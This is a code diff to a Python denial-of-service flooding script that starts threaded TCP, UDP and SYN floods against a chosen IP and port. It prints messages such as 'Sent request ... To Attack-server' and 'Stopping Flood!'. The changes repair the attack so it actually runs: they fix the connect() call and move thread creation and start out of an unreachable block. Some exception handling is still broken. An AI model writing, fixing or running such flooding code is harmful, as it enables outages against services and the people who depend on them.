@@ -60,7 +60,7 @@ class syn(threading.Thread):
     def run(self):
         for i in range(self.packets):
             try:
-                self.syn.connect(self.ip, self.port)
+                self.syn.connect((self.ip, self.port))
             except:
                 pass
 
@@ -79,7 +79,6 @@ class tcp(threading.Thread):
                 socket.connect(self.ip, self.port)
                 socket.setblocking(0)
                 socket.sendto(bytes,(self.ip, self.port))
-                
             except:
                 pass
 
@@ -105,16 +104,16 @@ while True:
     try:
         if size > 65507:
             sys.exit("Invalid Number Of Packets!")
-            t = tcp(ip,port,size,packets)
-            u = udp(ip,port,size,packets)       
-            s = syn(ip,port,packets)
-            t.start()
-            print("\033[33m[\033[1m+\033[33m]\033[92mSent request   " +str(u)+ "  \033[33mto Attack target" +str()+ "   \033[97m" +ip+ "\033[0m" )
-            u.start()
-            s.start()
+        u = udp(ip,port,size,packets)
+        t = tcp(ip,port,size,packets)
+        s = syn(ip,port,packets)
+        u.start()
+        t.start()
+        print("\033[33m[\033[1m+\033[33m]\033[92mSent request   " +str(u)+ "  \033[33mTo Attack-server " +str()+ "   \033[97m" +ip+ "\033[0m" )
+        s.start()
     except KeyboardInterrupt:
         print ("Stopping Flood!")
         sys.exit()
-    except (socket.error, msg):
+    except ('socket.error, msg'):
         print ("Socket Couldn't Connect")
         sys.exit()
